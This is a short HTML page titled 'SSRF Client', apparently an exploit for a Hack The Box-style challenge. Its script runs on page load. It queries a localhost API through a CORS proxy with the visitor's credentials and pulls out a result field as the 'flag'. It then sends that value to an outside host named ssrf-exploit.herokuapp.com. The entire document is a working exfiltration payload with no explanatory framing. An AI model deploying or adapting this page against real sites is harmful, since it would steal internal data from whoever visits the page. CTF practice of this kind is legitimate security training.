<!DOCTYPE html>
<html>

<body>
    <h1>SSRF Client</h1>
    <p>Testing websites for server side request forgery</p>
    <script>
        (async function () {
            await fetch(`https://cors-anywhere.herokuapp.com/corsdemo/http://127.0.0.1:1337/api/entries/search?q=HTB`, {
                    method: 'GET',
                    credentials: 'include'
                })
                .then((response) => response.json()
                    .then(async (resp) => {
                        if (response.status == 200) {
                            console.log(resp)
                            flag = resp[0].title
                            await fetch(`https://ssrf-exploit.herokuapp.com/flag?flag=${flag}`, {
                                method: 'GET',
                                credentials: 'include'
                            });
                        } else {
                            console.log("response failed")
                        }
                    }))
                .catch((error) => {
                    console.log('error')
                });
        })();
    </script>
</body>

</html>